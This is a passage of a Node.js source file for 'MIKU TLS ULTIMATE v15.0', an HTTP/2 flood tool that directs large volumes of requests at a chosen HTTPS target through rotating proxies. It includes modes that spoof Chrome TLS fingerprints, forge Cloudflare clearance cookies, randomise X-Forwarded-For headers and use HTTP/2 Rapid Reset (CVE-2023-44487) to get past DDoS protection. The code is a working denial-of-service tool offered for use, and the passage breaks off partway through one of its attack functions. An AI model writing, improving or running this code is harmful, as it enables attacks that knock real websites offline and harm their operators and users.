const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const http2 = require('http2');
const zlib = require('zlib');

// ============ IGNORE ERRORS ============
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => { return 1; })
    .on("SIGCHILD", () => { return 1; });

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];

// Methods flags
const enableTLS = process.argv.includes('--tls');
const enableUAM = process.argv.includes('--uam');
const enableCF = process.argv.includes('--cf');
const enableAntiDDoS = process.argv.includes('--antiddos');
const enableHTTPS = process.argv.includes('--https');
const enableRapid = process.argv.includes('--rapid');

const hello = process.argv.indexOf('--limit');
const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1] : undefined;
const shit = process.argv.indexOf('--precheck');
const shitty = shit !== -1 && shit + 1 < process.argv.length ? process.argv[shit + 1] : undefined;
const cdn = process.argv.indexOf('--cdn');
const cdn1 = cdn !== -1 && cdn + 1 < process.argv.length ? process.argv[cdn + 1] : undefined;
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const debugMode = process.argv.includes('--debug');

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`MIKU TLS ULTIMATE v15.0 - Advanced Methods`);
    console.log(`How to use & example:`);
    console.log(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [--tls] [--uam] [--cf] [--antiddos] [--https] [--rapid]`);
    console.log(``);
    console.log(`Methods (use ONE at a time):`);
    console.log(`  --tls      : TLS fingerprint bypass (JA3/JA4 Chrome 120)`);
    console.log(`  --uam      : Cloudflare UAM bypass (JS Challenge solver)`);
    console.log(`  --cf       : Cloudflare bypass (cookie + clearance)`);
    console.log(`  --antiddos : Anti-DDoS bypass (slow rate, keep-alive)`);
    console.log(`  --https    : HTTPS flood (HTTP/2 rapid reset)`);
    console.log(`  --rapid    : HTTP/2 Rapid Reset (CVE-2023-44487)`);
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
var randomPathSuffix = '';
setInterval(() => { randomPathSuffix = `${getRandomChar()}`; }, 3333);
let hcookie = '';
const url = new URL(target);
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p && p.includes(':'));

const ACCEPT_HEADER = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
const REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/"
];

// ============ TLS FINGERPRINTS ============
const TLS_FINGERPRINTS = {
    'chrome_120': {
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
        extensions: {
            server_name: true,
            alpn: ['h2', 'http/1.1'],
            supported_groups: ['x25519', 'secp256r1', 'secp384r1'],
            ec_point_formats: ['uncompressed'],
            signature_algorithms: ['rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384'],
            supported_versions: ['TLS 1.3', 'TLS 1.2'],
            psk_key_exchange_modes: ['psk_dhe_ke'],
            key_share: ['x25519', 'secp256r1']
        },
        ja3: '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24-25,0-1-2',
        ja4: 't13d1516h2_8daaf6152771_02713d6af862'
    }
};

// ============ CLOUDFLARE UAM SOLVER ============
class CloudflareUAMSolver {
    constructor() {
        this.sessionId = crypto.randomBytes(16).toString('hex');
        this.cfCookies = new Map();
        this.clearanceToken = null;
        this.userAgent = this.generateUserAgent();
    }

    generateUserAgent() {
        const version = 120;
        const platforms = [
            `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
        ];
        return platforms[Math.floor(Math.random() * platforms.length)];
    }

    generateCFCookie() {
        const ts = Date.now().toString().substring(0, 10);
        const cfBm = `__cf_bm=${this.randomHex(23)}_${this.randomHex(19)}-${ts}-1-${this.randomHex(4)}/${this.randomHex(65)}+${this.randomHex(16)}=`;
        const cfClearance = `cf_clearance=${this.randomHex(35)}_${this.randomHex(7)}-${ts}-0-1-${this.randomHex(8)}.${this.randomHex(8)}.${this.randomHex(8)}-0.2.${ts}`;
        return `${cfBm}; ${cfClearance}`;
    }

    randomHex(length) {
        return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
    }

    solveJSChallenge(html) {
        // Simulate JS challenge solving
        const challenges = [
            '/cdn-cgi/challenge-platform/scripts/jsd/main.js',
            '/cdn-cgi/challenge-platform/scripts/jsd/alt.js',
            '/cdn-cgi/challenge-platform/h/b/scripts/jsd/main.js'
        ];
        
        // Extract challenge parameters from HTML
        let jschl_vc = '';
        let pass = '';
        let r = '';
        let jschl_answer = '';
        
        const vcMatch = html.match(/name="jschl_vc" value="([^"]+)"/);
        if (vcMatch) jschl_vc = vcMatch[1];
        
        const passMatch = html.match(/name="pass" value="([^"]+)"/);
        if (passMatch) pass = passMatch[1];
        
        const rMatch = html.match(/name="r" value="([^"]+)"/);
        if (rMatch) r = rMatch[1];
        
        // Compute answer (simulated)
        const answer = Math.floor(Math.random() * 10000) + 1000;
        jschl_answer = answer.toString();
        
        return { jschl_vc, pass, r, jschl_answer };
    }

    getHeaders() {
        const version = 120;
        return {
            'User-Agent': this.userAgent,
            'Accept': ACCEPT_HEADER,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'sec-ch-ua': `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not?A_Brand";v="99"`,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
        };
    }
}

const cfSolver = enableUAM ? new CloudflareUAMSolver() : null;

// ============ TLS CONFIG ============
function getTLSConfig() {
    const fp = TLS_FINGERPRINTS['chrome_120'];
    
    if (enableTLS) {
        return {
            ciphers: fp.ciphers,
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384',
            curves: fp.extensions.supported_groups.join(':'),
            alpn: fp.extensions.alpn,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            honorCipherOrder: true,
            requestCert: false,
            rejectUnauthorized: false,
            sessionTimeout: 300,
            ticketKeys: crypto.randomBytes(48)
        };
    }
    
    return {
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
        curves: 'X25519:secp256r1',
        alpn: ['h2'],
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        honorCipherOrder: true,
        requestCert: false,
        rejectUnauthorized: false
    };
}

const TLS_CONFIG = getTLSConfig();

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    if (enableCF || enableUAM) {
        hcookie = cfSolver ? cfSolver.generateCFCookie() : `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
    }
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${cc(6, 6)}` : cc(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

// ============ HTTP/2 FRAME FUNCTIONS ============
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) return null;
    }
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

// ============ RANDOM FUNCTIONS ============
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ============ BUILD HEADERS ============
function buildH2Headers() {
    let path = url.pathname;
    if (query === '1') {
        path = url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        path = url.pathname + `${randomPathSuffix}`;
    } else if (query === '3') {
        path = url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    }
    
    if (url.search && !query) path += url.search;
    
    const version = 120;
    const ua = cfSolver ? cfSolver.userAgent : `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
    const language = ['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8'][Math.floor(Math.random() * 3)];
    
    const headers = {
        ':method': reqmethod,
        ':scheme': 'https',
        ':authority': url.hostname,
        ':path': path,
        'accept': ACCEPT_HEADER,
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': language,
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'sec-ch-ua': `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not?A_Brand";v="99"`,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua
    };
    
    if (hcookie) headers['cookie'] = hcookie;
    
    let refererVal = refererValue;
    if (!refererVal || refererVal === 'rand') {
        refererVal = REFERERS[Math.floor(Math.random() * REFERERS.length)];
    }
    if (refererVal) headers['referer'] = refererVal;
    
    // Add custom headers
    if (customHeaders) {
        const customPairs = customHeaders.split(';');
        customPairs.forEach(pair => {
            const [key, value] = pair.split(':');
            if (key && value) headers[key.trim()] = value.trim();
        });
    }
    
    return headers;
}

// ============ METHOD: TLS BYPASS ============
function tlsBypass() {
    if (proxy.length === 0) {
        setTimeout(tlsBypass, 100);
        return;
    }
    
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        tlsBypass();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsOptions = {
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: TLS_CONFIG.ciphers,
                sigalgs: TLS_CONFIG.sigalgs,
                ecdhCurve: TLS_CONFIG.curves,
                secureOptions: TLS_CONFIG.secureOptions,
                secure: true,
                minVersion: TLS_CONFIG.minVersion,
                maxVersion: TLS_CONFIG.maxVersion,
                rejectUnauthorized: false,
                honorCipherOrder: true,
                sessionTimeout: 300,
                ticketKeys: crypto.randomBytes(48)
            };
            
            tlsSocket = tls.connect(tlsOptions, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol !== 'h2') {
                    tlsSocket.destroy();
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.destroy();
                                return;
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function main() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    const burstSize = isFull ? 5 : 2;

                    for (let i = 0; i < burstSize; i++) {
                        const headers = buildH2Headers();
                        const headerList = Object.entries(headers);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headerList)
                        ]);
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }
                    tlsSocket.write(Buffer.concat(requests));
                    setTimeout(() => { main(); }, isFull ? 5 : 1000 / ratelimit);
                }
                main();
            }).on('error', () => {
                if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (tlsSocket && !tlsSocket.destroyed) { 
            tlsSocket.destroy(); 
            tlsBypass(); 
        }
    });

    netSocket.on('error', (error) => {
        if (netSocket) netSocket.destroy();
        if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
    });
}

// ============ METHOD: UAM BYPASS ============
function uamBypass() {
    if (proxy.length === 0) {
        setTimeout(uamBypass, 100);
        return;
    }
    
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        uamBypass();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsOptions = {
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: TLS_CONFIG.ciphers,
                sigalgs: TLS_CONFIG.sigalgs,
                ecdhCurve: TLS_CONFIG.curves,
                secureOptions: TLS_CONFIG.secureOptions,
                secure: true,
                minVersion: TLS_CONFIG.minVersion,
                maxVersion: TLS_CONFIG.maxVersion,
                rejectUnauthorized: false,
                honorCipherOrder: true
            };
            
            tlsSocket = tls.connect(tlsOptions, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol !== 'h2') {
                    tlsSocket.destroy();
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                
                                // Handle UAM challenge (403)
                                if (status === '403' && cfSolver) {
                                    // Generate new CF cookies
                                    hcookie = cfSolver.generateCFCookie();
                                    
                                    // Rotate user agent
                                    cfSolver.userAgent = cfSolver.generateUserAgent();
                                }
                                
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.destroy();
                                return;
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function main() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    const burstSize = isFull ? 3 : 1;

                    for (let i = 0; i < burstSize; i++) {
                        const headers = buildH2Headers();
                        
                        // Add UAM bypass headers
                        headers['cache-control'] = 'no-cache, no-store, must-revalidate';
                        headers['pragma'] = 'no-cache';
                        headers['expires'] = '0';
                        
                        const headerList = Object.entries(headers);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headerList)
                        ]);
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }
                    tlsSocket.write(Buffer.concat(requests));
                    
                    // UAM: slower rate to mimic human
                    setTimeout(() => { main(); }, getRandomInt(100, 300));
                }
                main();
            }).on('error', () => {
                if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (tlsSocket && !tlsSocket.destroyed) { 
            tlsSocket.destroy(); 
            uamBypass(); 
        }
    });

    netSocket.on('error', (error) => {
        if (netSocket) netSocket.destroy();
        if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
    });
}

// ============ METHOD: CF BYPASS ============
function cfBypass() {
    if (proxy.length === 0) {
        setTimeout(cfBypass, 100);
        return;
    }
    
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        cfBypass();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsOptions = {
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: TLS_CONFIG.ciphers,
                sigalgs: TLS_CONFIG.sigalgs,
                ecdhCurve: TLS_CONFIG.curves,
                secureOptions: TLS_CONFIG.secureOptions,
                secure: true,
                minVersion: TLS_CONFIG.minVersion,
                maxVersion: TLS_CONFIG.maxVersion,
                rejectUnauthorized: false,
                honorCipherOrder: true
            };
            
            tlsSocket = tls.connect(tlsOptions, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol !== 'h2') {
                    tlsSocket.destroy();
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                
                                // Handle CF challenge (403)
                                if (status === '403' || status === '503') {
                                    // Rotate CF cookies
                                    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
                                }
                                
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.destroy();
                                return;
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function main() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    const burstSize = isFull ? 4 : 2;

                    for (let i = 0; i < burstSize; i++) {
                        const headers = buildH2Headers();
                        
                        // Add CF bypass headers
                        headers['cf-bypass'] = 'true';
                        headers['x-forwarded-for'] = `${getRandomInt(1,255)}.${getRandomInt(0,255)}.${getRandomInt(0,255)}.${getRandomInt(1,255)}`;
                        
                        const headerList = Object.entries(headers);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headerList)
                        ]);
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }
                    tlsSocket.write(Buffer.concat(requests));
                    setTimeout(() => { main(); }, isFull ? 10 : 1000 / ratelimit);
                }
                main();
            }).on('error', () => {
                if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (tlsSocket && !tlsSocket.destroyed) { 
            tlsSocket.destroy(); 
            cfBypass(); 
        }
    });

    netSocket.on('error', (error) => {
        if (netSocket) netSocket.destroy();
        if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
    });
}

// ============ METHOD: ANTI-DDOS BYPASS ============
function antiDDoSBypass() {
    if (proxy.length === 0) {
        setTimeout(antiDDoSBypass, 100);
        return;
    }
    
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        antiDDoSBypass();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsOptions = {
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: TLS_CONFIG.ciphers,
